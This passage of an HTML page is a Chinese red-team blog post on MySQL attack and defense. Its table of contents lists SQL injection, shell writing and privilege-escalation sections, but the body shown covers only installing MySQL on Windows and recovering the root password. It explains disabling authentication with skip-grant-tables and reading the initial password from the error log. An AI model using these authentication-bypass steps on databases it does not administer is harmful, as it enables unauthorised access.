@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>数据库攻防之MySQL - T0x1c</title>
+
+  
+    <meta name="description" content="MySQL 是最流行的关系型数据库，与此同时也是 web 应用中最好的关系型数据库管理应用软件。我们在渗透过程中碰到的 PHP 站点大部分都会搭配 MySQL 数据库，因此它是红队攻防中最常遇到的数据库。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库攻防之MySQL">
+<meta property="og:url" content="https://toxic80l.github.io/post/240eacf2/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="MySQL 是最流行的关系型数据库，与此同时也是 web 应用中最好的关系型数据库管理应用软件。我们在渗透过程中碰到的 PHP 站点大部分都会搭配 MySQL 数据库，因此它是红队攻防中最常遇到的数据库。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-06%2016.46.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/2.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/3.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/4.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/5.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/6.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/7.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/8.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/9.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-21%20%E4%B8%8B%E5%8D%885.31.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.21.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.23.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.25.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.29.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-09-24%20%E4%B8%8A%E5%8D%881.33.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.28.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.34.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.34.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.38.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.38.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.40.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.43.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.45.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.49.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.50.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%8810.53.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2011.27.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2011.27.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2014.49.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.34.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.34.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2017.37.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2015.20.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2015.20.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-12%2018.17.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.18.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.18.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.29.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.29.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2021.14.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.15.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.18.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.21.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.21.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.55.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.00.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.11.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.15.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.37.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.21.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.47.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.48.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/3-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/9-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/3-2.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/4-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/5-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/6-1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2003.48.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2003.54.37.png">
+<meta property="article:published_time" content="2022-06-06T08:35:28.000Z">
+<meta property="article:modified_time" content="2022-06-16T20:21:07.112Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="数据库">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-06%2016.46.29.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-MySQL%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 MySQL简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-MySQL%E5%AE%89%E8%A3%85%E4%B8%8E%E8%BF%9E%E6%8E%A5"><span class="toc-text">0x02 MySQL安装与连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-text">MySQL安装配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%B8%8B%E5%AE%89%E8%A3%85"><span class="toc-text">Windows下安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E4%B8%8B%E5%AE%89%E8%A3%85"><span class="toc-text">Linux下安装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E8%BF%9E%E6%8E%A5"><span class="toc-text">MySQL连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Windows下连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Linux下连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-MySQL%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">0x03 MySQL基础用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E9%87%8A"><span class="toc-text">命令注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2"><span class="toc-text">高级查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2"><span class="toc-text">连接查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-MySQL%E6%B8%97%E9%80%8F"><span class="toc-text">0x04 MySQL渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-text">数据库信息获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-text">哈希获取与解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5"><span class="toc-text">文件读取与写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E5%86%99%E5%85%A5shell"><span class="toc-text">日志查询写入shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yaSSL%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-text">yaSSL缓冲区溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-text">身份认证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-1"><span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-text">MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85-2"><span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">启动项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-text">手动提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%8F%90%E6%9D%83"><span class="toc-text">MSF提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-MySQL%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">0x05 MySQL安全防护</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-06-06T08:35:28.000Z">2022-06-06</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>数据库攻防之MySQL</span></h1>
+<p>MySQL 是最流行的关系型数据库，与此同时也是 web 应用中最好的关系型数据库管理应用软件。我们在渗透过程中碰到的 PHP 站点大部分都会搭配 MySQL 数据库，因此它是红队攻防中最常遇到的数据库。<span id="more"></span></p>
+<h2 id="0x01-MySQL简介"><a href="#0x01-MySQL简介" class="headerlink" title="0x01 MySQL简介"></a>0x01 MySQL简介</h2><p>MySQL 是典型的关系型数据库，所谓的关系型数据库，其实就是建立在关系模型上的数据库，借助于集合代数等数学概念和方法来处理数据库当中的数据，它的特点如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、数据以表格的形式出现</span><br><span class="line">2、每行为各种数据记录</span><br><span class="line">3、每列为记录所对应的数据域</span><br><span class="line">4、许多行和列构成了一张表单</span><br><span class="line">5、若干个表单组成数据库</span><br></pre></td></tr></table></figure>
+
+<p>MySQL 由瑞典的 MySQL AB 公司开发，目前属于 Oracle 公司，它作为关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据都在放一个大仓库内，这极大提升了数据库的速度和灵活性。与此同时 MySQL 支持大型数据库，可以处理上千万条记录的大型数据库。同时能够运行在多个操作系统之上，并且支持多种语言，包括 C、C++、Python 等，特别对 PHP 语言有很好的支持。</p>
+<h2 id="0x02-MySQL安装与连接"><a href="#0x02-MySQL安装与连接" class="headerlink" title="0x02 MySQL安装与连接"></a>0x02 MySQL安装与连接</h2><h3 id="MySQL安装配置"><a href="#MySQL安装配置" class="headerlink" title="MySQL安装配置"></a>MySQL安装配置</h3><p>访问 MySQL 官网即可下载对应版本的数据库</p>
+<p><strong>下载地址：<a target="_blank" rel="noopener" href="https://www.mysql.com/downloads/">https://www.mysql.com/downloads/</a></strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-06%2016.46.29.png" alt="截屏2022-06-06 16.46.29"></p>
+<h4 id="Windows下安装"><a href="#Windows下安装" class="headerlink" title="Windows下安装"></a>Windows下安装</h4><p>选择 MySQL 社区版<code>MySQL community downloads</code>下载<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/2.png" alt="2"></p>
+<p>选择下载 MySQL 服务器<code>MySQL community server</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/3.png" alt="3"></p>
+<p>选择进入旧版本下载<code>looking for previous GA versions?</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/4.png" alt="4"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/5.png" alt="5"></p>
+<p>选择 Windows 64位 下载</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/6.png" alt="6"></p>
+<p>下载完成后将压缩包解压，解压至mysql目录中。但运行 mysql.exe 爆出<code>缺少dll文件</code>错误：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/7.png" alt="7"></p>
+<p>我们需要安装集成运行库，完成后即可执行<code>mysqld</code>，但是又出现如下下错误。根据提示在 mysql 目录下创建 data 目录用于存放数据，完成后执行成功。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/8.png" alt="8"></p>
+<p>但是还是打不开，在服务中未查找到 mysql 服务，于是在 mysql 目录下创建配置文件<code>mysql.ini</code></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">mysql</span>]</span><br><span class="line"><span class="comment"># 设置mysql客户端默认字符集</span></span><br><span class="line"><span class="string">default-character-set=utf8</span></span><br><span class="line">[<span class="string">mysqld</span>]</span><br><span class="line"><span class="comment"># 设置3306端口</span></span><br><span class="line"><span class="string">port</span> <span class="string">=</span> <span class="number">3306</span></span><br><span class="line"><span class="comment"># 设置mysql的安装目录</span></span><br><span class="line"><span class="string">basedir=C:\www\mysql</span></span><br><span class="line"><span class="comment"># 设置mysql数据库的数据的存放目录</span></span><br><span class="line"><span class="string">datadir=C:\www\mysql\data</span></span><br><span class="line"><span class="comment"># 允许最大连接数</span></span><br><span class="line"><span class="string">max_connections=200</span></span><br><span class="line"><span class="comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span></span><br><span class="line"><span class="string">character-set-server=utf8</span></span><br><span class="line"><span class="comment"># 创建新表时将使用的默认存储引擎</span></span><br><span class="line"><span class="string">default-storage-engine=INNODB</span></span><br></pre></td></tr></table></figure>
+<p>以管理员身份运行cmd（否则无法创建 mysql 服务），进入 mysql 的 bin 目录中执行命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqld --install  <span class="comment">#安装</span></span><br><span class="line">mysqld --initialize <span class="comment">#初始化</span></span><br><span class="line">net start mysql <span class="comment">#运行</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/9.png" alt="9"></p>
+<p>在版本5.6及以下无需密码即可登录，但本数据库版本为8.0，存在以下两种方式获取密码</p>
+<p><strong>方法一</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、在 mysql.ini 文件末尾加上<span class="keyword">skip</span><span class="operator">-</span><span class="keyword">grant</span><span class="operator">-</span>tables（取消权限设置）保存文件。</span><br><span class="line"><span class="number">2</span>、重启mysql服务</span><br><span class="line"><span class="number">3</span>、cmd下进入 mysql<span class="operator">/</span>bin 目录，输入 mysql <span class="operator">-</span>u root <span class="operator">-</span>p ，回车，这时候不需要密码即可登录</span><br><span class="line">重置密码。输入 use mysql 回车 </span><br><span class="line"><span class="number">4</span>、输入如下命令修改密码，需要注意的是新版本下 mysql 数据库 password 字段更改为authentication_string</span><br><span class="line"></span><br><span class="line">update <span class="keyword">user</span> <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(&quot;newPassword&quot;) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span>&quot;root&quot;; </span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、删除 mysql.ini 文件末尾 <span class="keyword">skip</span><span class="operator">-</span><span class="keyword">grant</span><span class="operator">-</span>tables 并保存文件</span><br><span class="line"><span class="number">6</span>、重启 mysql 服务后就能用新密码登录 root 账户 </span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二</strong></p>
+<p>在目录<code>data/*.err</code>文件中可显示直接密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/10.png" alt="10"><br>使用该密码能够直接登录数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -u root -p </span><br></pre></td></tr></table></figure>
